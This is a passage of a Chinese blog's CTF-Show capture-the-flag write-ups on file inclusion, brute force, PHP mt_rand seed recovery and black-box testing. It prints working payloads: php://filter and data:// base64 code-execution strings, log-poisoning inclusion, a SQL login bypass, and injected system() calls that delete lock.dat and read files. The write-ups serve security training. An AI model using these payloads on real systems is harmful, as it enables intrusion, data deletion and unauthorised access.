<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 过滤 php data :  Web 80-81# 日志包含?file=/var/log/nginx/access.log  # 发送包时写入 代码# 过滤 .   Web 82-86# SESSION 包含 条件竞争&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;&lt;form action=&quot;http://708cd0ba-4c4a-40c7-b53c-0dca6ac256fe.challenge.ctf.show:8080/&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;    &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt;    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;    &lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;# &lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;死亡绕过  Web 87?filename=php://filter/write=convert.base64-decode/resource=1.php?content=aaPD9waHAgc3lzdGVtKCdscycpOyA/Pg==# &lt;?php system(&#x27;ls&#x27;); ?&gt;# 过滤 + = 限制 base64		Web 88# 拼凑 php 语句?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdscycpOyA/PmFi# PD9waHAgc3lzdGVtKCdscycpOyA/PmFi 解码是 &lt;?php system(&#x27;ls&#x27;); ?&gt;ab</span></span><br></pre></td></tr></table></figure>



<p>参考</p>
<p><a href="https://blog.csdn.net/weixin_45882317/article/details/114576726">https://blog.csdn.net/weixin_45882317/article/details/114576726</a></p>
]]></content>
      <categories>
        <category>CTF Show</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF-Show-爆破</title>
    <url>/2021/10/01/CTF-Show-%E7%88%86%E7%A0%B4/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>CTF show 爆破篇。</p>
<span id="more"></span>

<h1 id="一、CTF-show-—-爆破"><a href="#一、CTF-show-—-爆破" class="headerlink" title="一、CTF show — 爆破"></a>一、CTF show — 爆破</h1><h2 id="1-1-Web-21-—-Burp-爆破-—-base64-encode"><a href="#1-1-Web-21-—-Burp-爆破-—-base64-encode" class="headerlink" title="1.1 Web 21 — Burp 爆破 — base64-encode"></a>1.1 Web 21 — Burp 爆破 — base64-encode</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">爆破什么的，都是基操</span><br></pre></td></tr></table></figure>

<p><strong>抓包查看</strong>：输入的账号密码都被base64加密了，并且中间还有一个 <code>:</code> 分割</p>
<p>Burp 抓包，下载题目给的字典，进行爆破：手动更改 <code>admin:</code> base64 加密之后的内容，只将密码部分设为变量，加载题目字典，设置 base64-encode 加密，<strong>去掉勾选 URL编码</strong>，开始攻击。</p>
<p><img src="https://i.loli.net/2021/07/14/MTD1Bp7G5F2tAiU.png" alt="image-20210714212830673"></p>
<p><img src="https://i.loli.net/2021/07/14/bxHg23aGJ7BWPe6.png" alt="image-20210714212813152"></p>
<h2 id="1-2-Web-22-—-子域名爆破-—-subDomainBrute-工具"><a href="#1-2-Web-22-—-子域名爆破-—-subDomainBrute-工具" class="headerlink" title="1.2 Web 22 — 子域名爆破 — subDomainBrute 工具"></a>1.2 Web 22 — 子域名爆破 — subDomainBrute 工具</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">域名也可以爆破的，试试爆破这个ctf.show的子域名</span><br></pre></td></tr></table></figure>

<p><strong>subDomainBrute 工具子域名爆破</strong></p>
<p><img src="https://i.loli.net/2021/07/15/24RTe3VNyP5ujhU.png" alt="image-20210715113857094"></p>
<p>访问 <code>http://flag.ctfer.com/index.php</code></p>
<h2 id="1-3-Web-23-—-根据代码要求写脚本"><a href="#1-3-Web-23-—-根据代码要求写脚本" class="headerlink" title="1.3 Web 23 — 根据代码要求写脚本"></a>1.3 Web 23 — 根据代码要求写脚本</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">还爆破？这么多代码，告辞！</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;token&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$token</span> = md5(<span class="variable">$_GET</span>[<span class="string">&#x27;token&#x27;</span>]);</span><br><span class="line">        <span class="keyword">if</span>(substr(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===substr(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) &amp;&amp; substr(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) ===substr(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span>((intval(substr(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>))+intval(substr(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>))+substr(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))/substr(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===intval(substr(<span class="variable">$token</span>, <span class="number">31</span>,<span class="number">1</span>)))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>分析：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">intval(<span class="keyword">mixed</span> <span class="variable">$var</span> [, <span class="keyword">int</span> <span class="variable">$base</span> = <span class="number">10</span> ]) 函数通过使用指定的进制 base 转换（默认是十进制），返回变量 <span class="keyword">var</span> 的 <span class="keyword">integer</span> 数值</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>脚本：如果是 二位数</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">error_reporting(0); </span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;asdfghjklqwertyuiopzxcvbnm1234567890&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=0;<span class="variable">$i</span>&lt;36;<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$j</span>=0;<span class="variable">$j</span>&lt;36;<span class="variable">$j</span>++)&#123;</span><br><span class="line">        <span class="variable">$token</span>=<span class="variable">$a</span>[<span class="variable">$i</span>].<span class="variable">$a</span>[<span class="variable">$j</span>];    </span><br><span class="line">        <span class="variable">$token</span> = md5(<span class="variable">$token</span>); </span><br><span class="line">        <span class="keyword">if</span>(substr(<span class="variable">$token</span>, 1,1)===substr(<span class="variable">$token</span>, 14,1) &amp;&amp; substr(<span class="variable">$token</span>, 14,1) ===substr(<span class="variable">$token</span>, 17,1))&#123; </span><br><span class="line">            <span class="keyword">if</span>((intval(substr(<span class="variable">$token</span>, 1,1))+intval(substr(<span class="variable">$token</span>, 14,1))+substr(<span class="variable">$token</span>, 17,1))/substr(<span class="variable">$token</span>, 1,1)===intval(substr(<span class="variable">$token</span>, 31,1)))&#123; </span><br><span class="line">                <span class="built_in">echo</span> <span class="variable">$a</span>[<span class="variable">$i</span>].<span class="variable">$a</span>[<span class="variable">$j</span>];</span><br><span class="line">                <span class="built_in">exit</span>(0);</span><br><span class="line">            &#125; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line">?&gt; </span><br><span class="line"><span class="comment"># 得到 3j</span></span><br></pre></td></tr></table></figure>

<p><strong>脚本：如果是 三位数</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"><span class="variable">$string</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line"><span class="built_in">print</span> (strlen(<span class="variable">$string</span>).<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$a</span> = 0; <span class="variable">$a</span> &lt; 62; <span class="variable">$a</span>++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$b</span> = 0; <span class="variable">$b</span> &lt; 62; <span class="variable">$b</span>++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$c</span> = 0; <span class="variable">$c</span> &lt; 62; <span class="variable">$c</span>++) &#123;</span><br><span class="line">            <span class="variable">$flag</span> = <span class="variable">$string</span>[<span class="variable">$a</span>] . <span class="variable">$string</span>[<span class="variable">$b</span>] . <span class="variable">$string</span>[<span class="variable">$c</span>];</span><br><span class="line">            <span class="variable">$token</span> = md5(<span class="variable">$flag</span>);</span><br><span class="line">            <span class="keyword">if</span>(substr(<span class="variable">$token</span>, 1,1)===substr(<span class="variable">$token</span>, 14,1) &amp;&amp; substr(<span class="variable">$token</span>, 14,1) ===substr(<span class="variable">$token</span>, 17,1))&#123; </span><br><span class="line">            	<span class="keyword">if</span>((intval(substr(<span class="variable">$token</span>, 1,1))+intval(substr(<span class="variable">$token</span>, 14,1))+substr(<span class="variable">$token</span>, 17,1))/substr(<span class="variable">$token</span>, 1,1)===intval(substr(<span class="variable">$token</span>, 31,1)))&#123; </span><br><span class="line">                    <span class="built_in">echo</span> <span class="variable">$flag</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 得到 62 aDp a6e b7l ejt hc2 jGd ktD o07 pjd ubv vMJ v8O wuB wyG xjF AKh DCj D36 GT7 H3D Jik JKh KtR K2e LfJ Lqj Nzc Oie OiU R7V ScB SSM SVi UYg WwF 1zg 4cQ 422 6xU 6Vh 7vE</span></span><br></pre></td></tr></table></figure>

<h2 id="1-4-Web-24-—-php-伪随机数-—-mt-srand"><a href="#1-4-Web-24-—-php-伪随机数-—-mt-srand" class="headerlink" title="1.4 Web 24 — php 伪随机数 — mt_srand()"></a>1.4 Web 24 — php 伪随机数 — mt_srand()</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>];</span><br><span class="line">    mt_srand(372619038);</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$r</span>)===intval(mt_rand()))&#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    <span class="built_in">echo</span> system(<span class="string">&#x27;cat /proc/version&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>测试：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?phpmt_srand(372619038);<span class="built_in">echo</span>(mt_rand());?&gt;<span class="comment"># 得到 1155388967</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>伪随机数漏洞：当种子不变时，实际上生成的随机数是固定的。</strong></p>
</blockquote>
<p><img src="https://i.loli.net/2021/08/03/41LYMjzASdVfFUW.png" alt="image-20210803191659621"></p>
<p><img src="https://i.loli.net/2021/08/03/Jh12MBwLlyzgCNH.png" alt="image-20210803191723585"></p>
<h2 id="1-5-Web-25-—-php-伪随机数-逆推种子-—-php-mt-seed-工具使用"><a href="#1-5-Web-25-—-php-伪随机数-逆推种子-—-php-mt-seed-工具使用" class="headerlink" title="1.5 Web 25 — php 伪随机数 逆推种子 — php_mt_seed 工具使用"></a>1.5 Web 25 — php 伪随机数 逆推种子 — php_mt_seed 工具使用</h2><p><a href="https://www.cnblogs.com/zaqzzz/p/9997855.html">https://www.cnblogs.com/zaqzzz/p/9997855.html</a></p>
<p>知道种子，可以确定你输出伪随机数的序列</p>
<p>知道随机数序列，倒过来也可以确定你的种子，如何确定？</p>
<p>工具 php_mt_seed</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?phperror_reporting(0);include(<span class="string">&quot;flag.php&quot;</span>);<span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]))&#123;    <span class="variable">$r</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>];    mt_srand(hexdec(substr(md5(<span class="variable">$flag</span>), 0,8)));    <span class="variable">$rand</span> = intval(<span class="variable">$r</span>)-intval(mt_rand());    <span class="keyword">if</span>((!<span class="variable">$rand</span>))&#123;        <span class="keyword">if</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;token&#x27;</span>]==(mt_rand()+mt_rand()))&#123;            <span class="built_in">echo</span> <span class="variable">$flag</span>;        &#125;    &#125;<span class="keyword">else</span>&#123;        <span class="built_in">echo</span> <span class="variable">$rand</span>;    &#125;&#125;<span class="keyword">else</span>&#123;    highlight_file(__FILE__);    <span class="built_in">echo</span> system(<span class="string">&#x27;cat /proc/version&#x27;</span>);&#125;</span><br></pre></td></tr></table></figure>

<p><strong>分析：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexdec() 函数把十六进制转换为十进制。mt_srand(hexdec(substr(md5(<span class="variable">$flag</span>), 0,8)));	<span class="comment">#确定 种子$rand = intval($r)-intval(mt_rand());		#得到随机数，与传入的 ?r 有关如果该随机数不存在，则输出 $rand如果该随机数存在，并且 $_COOKIE[&#x27;token&#x27;]==(mt_rand()+mt_rand()) 则输出 $flag**代码分析**</span></span><br></pre></td></tr></table></figure>

<ul>
<li>那么生成的随机数，也就是与传入的 r 有关，而 r 我们可控</li>
<li>通过生成的随机数进行逆推可以得到种子，<a href="https://www.openwall.com/php_mt_seed/">工具 php_mt_seed</a></li>
</ul>
<p>还要注意的是：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">得到 <span class="variable">$flag</span> 的条件：1. !<span class="variable">$rand</span> 即 <span class="variable">$rand</span> 不存在2. <span class="variable">$_COOKIE</span>[<span class="string">&#x27;token&#x27;</span>]==(mt_rand()+mt_rand()) 也就是说，我们得计算出 token 的值，然后发包的时候要进行修改</span><br></pre></td></tr></table></figure>

<p>如何确保 <code>$rand 不存在</code> ？</p>
<p>测试</p>
<p><img src="https://i.loli.net/2021/08/04/AwBydsMHNcEvTaf.png" alt="image-20210804104524845"></p>
<p>当我们设置了种子之后 <code>mt_srand</code> ，我们只要传 同样的 r ，那么最终得到的 $rand 都是一样的，那么反过来，如果 我们传入 <code>?r=522258682</code> ，那最终就可以得到 $rand = 0</p>
<p><img src="https://i.loli.net/2021/08/04/cxFHsZhzS9WkE7i.png" alt="image-20210804104657248"></p>
<p>那现在我们就得要计算 <code>(mt_rand()+mt_rand())</code> 了</p>
<p>要计算生成的随机数之和，首先得先确定种子才行啊</p>
<p>使用工具 php_mt_seed</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/otukijoe/php_mt_seed.git</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/08/04/s7z4fFxmrRypnAv.png" alt="image-20210804105157149"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">maketime ./php_mt_seed 1446899118</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/08/04/oGrb6JHqlOXT7VW.png" alt="image-20210804105726200"></p>
<p>通过抓包可以知道 该 php 版本是 PHP/7.3.11</p>
<p>计算 token 值：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>highlight_file(<span class="keyword">__FILE__</span>);mt_srand(<span class="number">1048340704</span>);<span class="keyword">echo</span> mt_rand().<span class="string">&quot;\n&quot;</span>;<span class="keyword">echo</span> mt_rand()+mt_rand().<span class="string">&quot;\n&quot;</span>;<span class="comment">//1446899118 219330488<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>抓包改值</p>
<p><img src="https://i.loli.net/2021/08/04/W1RHU2xBnvaPcCy.png" alt="image-20210804110911859"></p>
<h2 id="1-6-Web-26"><a href="#1-6-Web-26" class="headerlink" title="1.6 Web 26"></a>1.6 Web 26</h2><p><img src="https://i.loli.net/2021/08/04/EMhK6QNp3OcSnyA.png" alt="image-20210804111036383"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<p> 查看源码</p>
<p><img src="https://i.loli.net/2021/08/04/jWUtw3qxuB1pd2s.png" alt="image-20210804111200056"></p>
<p><img src="https://i.loli.net/2021/08/04/x18GrqLFoT5PRV7.png" alt="image-20210804111426026"></p>
<h2 id="1-7-Web-27-—-身份证爆破"><a href="#1-7-Web-27-—-身份证爆破" class="headerlink" title="1.7 Web 27 — 身份证爆破"></a>1.7 Web 27 — 身份证爆破</h2><p><img src="https://i.loli.net/2021/08/04/o42RDNuHFIJBS8Y.png" alt="image-20210804112204280"></p>
<p> <img src="https://i.loli.net/2021/08/04/piUhumyn5bV4aEq.png" alt="image-20210804111755165"></p>
<p><img src="https://i.loli.net/2021/08/04/TVUe3r1Y2vjW5ER.png" alt="image-20210804111806858"></p>
<p>我们需要爆破出 学生的出生日期</p>
<p>Burp</p>
<p>上面可以看到该平台是 1999-2017 年的，那么作为大学生此时应该十八九岁，所以他们应该是1980 年之后的基本上</p>
<p>那么我们就从 1980 年开始设置 date 字典</p>
<p><img src="https://i.loli.net/2021/08/04/c15B8xbASmQryaW.png" alt="image-20210804113135627"></p>
<p>然后成功查询，得到  <strong>恭喜您，您已被我校录取，你的学号为02015237 初始密码为身份证号码</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">621022199002015237  02015237</span><br></pre></td></tr></table></figure>

<p>最后成功登录即可</p>
<h2 id="1-8-Web-28"><a href="#1-8-Web-28" class="headerlink" title="1.8 Web 28"></a>1.8 Web 28</h2><p><img src="https://i.loli.net/2021/08/04/lCz96ZbM1hA7tKR.png" alt="image-20210804114109990"></p>
<p>Url 当中的 <code>/0/1/</code> 尝试爆破，即可得到</p>
]]></content>
      <categories>
        <category>CTF Show</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF-Show-黑盒测试</title>
    <url>/2021/11/19/CTF-Show-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="一、黑盒测试"><a href="#一、黑盒测试" class="headerlink" title="一、黑盒测试"></a>一、黑盒测试</h1><h2 id="1-1-Web-380"><a href="#1-1-Web-380" class="headerlink" title="1.1 Web 380"></a>1.1 Web 380</h2><p>扫目录可以发现</p>
<p><img src="https://i.loli.net/2021/08/04/oQUxOMAecNVramB.png" alt="image-20210804135546210"></p>
<p><img src="https://i.loli.net/2021/08/04/PHiK79wfyUxTWGe.png" alt="image-20210804135326954"></p>
<p>尝试 ?id=2</p>
<p><img src="https://i.loli.net/2021/08/04/pgPURTNBjht75o6.png" alt="image-20210804135348176"></p>
<p>可以看到是 <code>file_get_contents</code> </p>
<p>那 <code>?id=flag</code> 尝试 ，查源码得到</p>
<h2 id="1-2-Web-381"><a href="#1-2-Web-381" class="headerlink" title="1.2 Web 381"></a>1.2 Web 381</h2><p><img src="C:\Users\yinanping\AppData\Roaming\Typora\typora-user-images\image-20210804135637994.png" alt="image-20210804135637994"></p>
<p>可以看到这里与之前不同，但是尝试访问过后，依旧不行</p>
<p>那继续扫，发现，仍然得到了 <code>page.php</code></p>
<p><img src="https://i.loli.net/2021/08/04/lC5HYPfB4xVj9DE.png" alt="image-20210804140001237"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?id=1</span><br><span class="line">2 3 4</span><br><span class="line"><span class="comment"># 发现对应的是每一篇报道</span></span><br></pre></td></tr></table></figure>

<p>依次访问，最终无所获，且尝试过后 <code>page_flag.php</code> 应该也是不存在的</p>
<p>又回到最初发现的原密码目录，再次尝试，成功</p>
<p><img src="https://i.loli.net/2021/08/04/SrIFG9wsRJ6mzAQ.png" alt="image-20210804140511148"></p>
<h2 id="1-3-Web-382-383"><a href="#1-3-Web-382-383" class="headerlink" title="1.3 Web 382-383"></a>1.3 Web 382-383</h2><p>这次再直接访问过后，就是登录页面</p>
<p><img src="https://i.loli.net/2021/08/04/u5OVsHQIXcv7lBe.png" alt="image-20210804140652142"></p>
<p><strong>SQL 万能密码</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">username: admin<span class="string">&#x27;or&#x27;</span>1<span class="string">&#x27;=&#x27;</span>1</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/08/04/JTAzCBqfjY9sahW.png" alt="image-20210804140903548"></p>
<p><strong>密码爆破</strong></p>
<p><img src="https://i.loli.net/2021/08/04/DW685jRtagGKIeb.png" alt="image-20210804141939521"></p>
<h2 id="1-4-Web-384"><a href="#1-4-Web-384" class="headerlink" title="1.4 Web 384"></a>1.4 Web 384</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">密码前2位是小写字母，后三位是数字</span><br></pre></td></tr></table></figure>

<p>万能密码不可行，只能根据题目进行爆破</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">str = <span class="string">&#x27;abcdefghigklmnopqrstuvwxyz&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> str:</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> str:</span><br><span class="line">		<span class="built_in">print</span>(i,j)</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/08/04/GK4kNicyxXmhBvV.png" alt="image-20210804144019115"></p>
<h2 id="1-5-Web-385"><a href="#1-5-Web-385" class="headerlink" title="1.5 Web 385"></a>1.5 Web 385</h2><p>同样有后台登录，但是密码也没有提示，我们先不进行爆破</p>
<p>扫目录，有新的发现</p>
<p><img src="https://i.loli.net/2021/08/04/TtuqMYQVP65XOe9.png" alt="image-20210804144556248"></p>
<p><img src="https://i.loli.net/2021/08/04/qeb5Y4MXhUW29KP.png" alt="image-20210804144644455"></p>
<p><img src="https://i.loli.net/2021/08/04/sGpZi9luOXMehTP.png" alt="image-20210804144714402"></p>
<p>证明我们已经重置了密码，那么 所谓的 默认密码是多少呢？</p>
<p>不管是多少，肯定是弱密码，我们可以再进行爆破，也可以结合之前所爆破出来的密码尝试</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">admin888</span><br></pre></td></tr></table></figure>

<h2 id="1-6-Web-386"><a href="#1-6-Web-386" class="headerlink" title="1.6 Web 386"></a>1.6 Web 386</h2><p>说是扫出来的 <code>clear.php</code> ，但是我 dirsearch 没有扫出来，说白了，还是字典不够强大</p>
<p><img src="https://i.loli.net/2021/08/04/XCiA4ofnjSg5YJM.png" alt="image-20210804145328318"></p>
<p>也就是说，我们需要首先清除掉 <code>lock.dat</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/clear.php?file=./install/lock.dat</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/08/04/FOypT7ZMeIN8i9U.png" alt="image-20210804150138828"></p>
<p>清理成功之后再次像上一关那样就好了</p>
<h2 id="1-7-Web-387"><a href="#1-7-Web-387" class="headerlink" title="1.7 Web 387"></a>1.7 Web 387</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">前面部分和386一样</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/08/04/jeDxClWqETONUgm.png" alt="image-20210804150816749"></p>
<p>说是和上一关一样，但是这次删不了，我们继续扫目录</p>
<p><img src="https://i.loli.net/2021/08/04/BS9COfTgGrAX2wY.png" alt="image-20210804150803918"></p>
<p><img src="https://i.loli.net/2021/08/04/gkam7jJ3xovDQ4Y.png" alt="image-20210804150901657"></p>
<p><img src="https://i.loli.net/2021/08/04/Ev3jVune7N5tgOb.png" alt="image-20210804150936797"></p>
<p>看来 robots.txt 也是用来提示我们 <code>/debug/</code> 的</p>
<p>尝试传递参数试试</p>
<p><img src="https://i.loli.net/2021/08/04/p4wzKtHeGEb8SuI.png" alt="image-20210804151150834"></p>
<p><img src="https://i.loli.net/2021/08/04/jRNg9zqTElSA6iP.png" alt="image-20210804151227962"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?file=php://filter/resource=flag.php</span><br><span class="line">?file=/flag</span><br><span class="line"><span class="comment">#等等都查不出来</span></span><br></pre></td></tr></table></figure>

<p>那么，进行日志包含</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?file=/var/<span class="built_in">log</span>/nginx/access.log</span><br></pre></td></tr></table></figure>

<p>然后抓包修改，写入命令</p>
<p><img src="https://i.loli.net/2021/08/04/JEI8PWZ9qznGy4o.png" alt="image-20210804151954242"></p>
<p>只在当前页面发现了一个 <code>index.php</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/*</span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2021-01-09 15:26:15</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2021-01-09 15:30:48</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">	<span class="variable">$html</span> = shell_exec(<span class="string">&#x27;php -f &#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">	<span class="built_in">echo</span> <span class="variable">$html</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="built_in">echo</span> <span class="string">&#x27;file not exist&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="string">&quot;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php system(<span class="string">&#x27;ls /var/www/html/&#x27;</span>);</span><br><span class="line">alsckdfy</span><br><span class="line">clear.php</span><br><span class="line">debug</span><br><span class="line">index.php</span><br><span class="line">install</span><br><span class="line">layui</span><br><span class="line">page.php</span><br><span class="line">page_1.php</span><br><span class="line">page_2.php</span><br><span class="line">page_3.php</span><br><span class="line">page_4.php</span><br><span class="line">robots.txt</span><br><span class="line"></span><br><span class="line">&lt;?php system(<span class="string">&#x27;ls /&#x27;</span>); ?&gt;</span><br><span class="line">bin</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">home</span><br><span class="line">lib</span><br><span class="line">media</span><br><span class="line">mnt</span><br><span class="line">opt</span><br><span class="line">proc</span><br><span class="line">root</span><br><span class="line">run</span><br><span class="line">sbin</span><br><span class="line">srv</span><br><span class="line">sys</span><br><span class="line">tmp</span><br><span class="line">usr</span><br><span class="line">var</span><br></pre></td></tr></table></figure>

<p>看样子没有 flag</p>
<p>那么根据之前的思路，我们只要把 <code>lock.dat</code>  删掉，那么就可以重置管理员密码，就能够成功登录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php system(<span class="string">&#x27;rm ../install/lock.dat&#x27;</span>); ?&gt;</span><br><span class="line">然后我们可以再进行验证一下</span><br><span class="line">&lt;?php system(<span class="string">&#x27;ls ../install/&#x27;</span>); ?&gt;</span><br></pre></td></tr></table></figure>

<p>此时再访问 <code>install</code> ，已经变成</p>
<p><img src="https://i.loli.net/2021/08/04/SmO1ys82bwBzTiv.png" alt="image-20210804153001982"></p>
<p><img src="https://i.loli.net/2021/08/04/bWPpJf9c34qQKSV.png" alt="image-20210804153015432"></p>
<p>然后进入后台登陆即可 <code>admin888</code></p>
<p>最后才想到，flag 应该是出现在 登陆成功之后的页面里的，也就是 <code>/alsckdfy/check.php</code> ，所以我们也完全可以 </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php system(<span class="string">&#x27;cat ../alsckdfy/check.php&#x27;</span>); ?&gt;</span><br></pre></td></tr></table></figure>

<p>即可查到</p>
<p><img src="https://i.loli.net/2021/08/04/NteX42lnw3yVIoT.png" alt="image-20210804153236220"></p>
